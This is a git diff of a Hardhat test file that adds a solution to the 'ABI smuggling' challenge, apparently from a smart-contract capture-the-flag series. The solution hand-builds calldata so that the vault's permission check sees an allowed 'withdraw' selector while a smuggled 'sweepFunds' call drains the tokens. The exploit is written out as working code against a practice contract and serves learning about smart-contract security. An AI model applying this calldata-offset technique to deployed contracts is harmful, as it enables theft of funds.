@@ -1,5 +1,6 @@
 const { ethers } = require("hardhat");
 const { expect } = require("chai");
+const { AbiCoder } = require("ethers/lib/utils");
 
 describe("[Challenge] ABI smuggling", function () {
   let deployer, player, recovery;
@@ -57,7 +58,35 @@ describe("[Challenge] ABI smuggling", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    // Maybe try to call the function in authorized execution as we have been given permission
+    const attackVault = await vault.connect(player);
+    const attackToken = await token.connect(player);
+
+    const executeFs = vault.interface.getSighash("execute");
+    const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
+    const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2);
+    const withdrawSelector = vault.interface.getSighash("withdraw").slice(2);
+
+    const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2);
+    const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
+    const sweepFundsData =
+      ethers.utils.hexZeroPad(recovery.address, 32).slice(2) +
+      ethers.utils.hexZeroPad(attackToken.address, 32).slice(2);
+
+    const payload =
+      executeFs +
+      target +
+      bytesLocation +
+      ethers.utils.hexZeroPad("0x0", 32).slice(2) +
+      withdrawSelector +
+      ethers.utils.hexZeroPad("0x0", 28).slice(2) +
+      bytesLength +
+      sweepSelector +
+      sweepFundsData;
+
+    await player.sendTransaction({
+      to: attackVault.address,
+      data: payload,
+    });
   });
 
   after(async function () {
